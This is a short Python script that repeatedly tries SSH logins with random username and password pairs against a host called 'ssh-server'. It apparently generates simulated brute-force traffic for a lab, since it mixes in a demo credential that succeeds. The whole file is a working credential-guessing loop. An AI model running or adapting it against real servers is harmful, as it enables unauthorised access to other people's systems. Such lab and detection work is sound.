import os
import time
import random
import paramiko

HOST = "ssh-server"
PORT = 22

USERS = [s.strip() for s in os.environ["USERS"].split(",") if s.strip()]
PASSWORDS = [s.strip() for s in os.environ["PASSWORDS"].split(",") if s.strip()]

DEMO_USER = os.environ["DEMO_USER"]
DEMO_PASSWORD = os.environ["DEMO_PASSWORD"]

def attempt_login(username: str, password: str) -> None:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            HOST,
            PORT,
            username=username,
            password=password,
            timeout=3,
            allow_agent=False,
            look_for_keys=False,
        )
        print(f"[+] Success: {username}/{password}")
    except paramiko.AuthenticationException:
        print(f"[-] Failed: {username}/{password}")
    except Exception as e:
        print(f"[!] Error for {username}/{password}: {e}")
    finally:
        client.close()

def main():
    while True:
        if random.random() < 0.3:
            user, pw = DEMO_USER, DEMO_PASSWORD
        else:
            user, pw = random.choice(USERS), random.choice(PASSWORDS)

        attempt_login(user, pw)
        time.sleep(random.uniform(0.5, 2.0))

if __name__ == "__main__":
    main()